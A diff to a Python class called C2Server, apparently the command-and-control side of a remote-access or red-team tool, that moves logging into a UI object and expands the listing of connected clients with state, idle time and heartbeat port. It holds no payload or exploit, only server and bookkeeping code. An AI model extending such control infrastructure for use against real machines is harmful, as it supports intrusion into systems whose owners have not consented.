@@ -25,9 +25,10 @@ class C2Server:
     def log(self, msg):
         self.logger.log(msg)
 
-    def start(self):
-        threading.Thread(target=self.logger.printer, daemon=True).start()
-        threading.Thread(target=heartbeat_sender, args=(self,), daemon=True).start()
+    def start(self, ui):
+        if not getattr(ui, "handles_logs", False):
+            threading.Thread(target=self.logger.printer, daemon=True).start()
+            threading.Thread(target=heartbeat_sender, args=(self,), daemon=True).start()
 
         server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
@@ -41,6 +42,8 @@ class C2Server:
             args=(self, server),
             daemon=True
         ).start()
+
+        ui.run(self)
 
         return server
 
@@ -89,11 +92,17 @@ class C2Server:
 
     def list_command(self):
         with self.lock:
-            for client in self.clients.values():
+            clients = self.clients.values()
+            if not clients:
+                self.log("No clients registered")
+                return
+            
+            self.log("Clients:")
+            for client in clients:
                 with client.lock:
                     state = "ACTIVE" if client.active else "INACTIVE"
                     idle = int(time.time() - client.last_seen)
-                    print(
+                    self.log(
                         f"{client.unique_id} -> {client.ip}:{client.port} "
-                        f"{state} idle:{idle}s"
+                        f"State: {state}; idle:{idle}s; HeartBeat port:{client.heartbeat_port}"
                     )
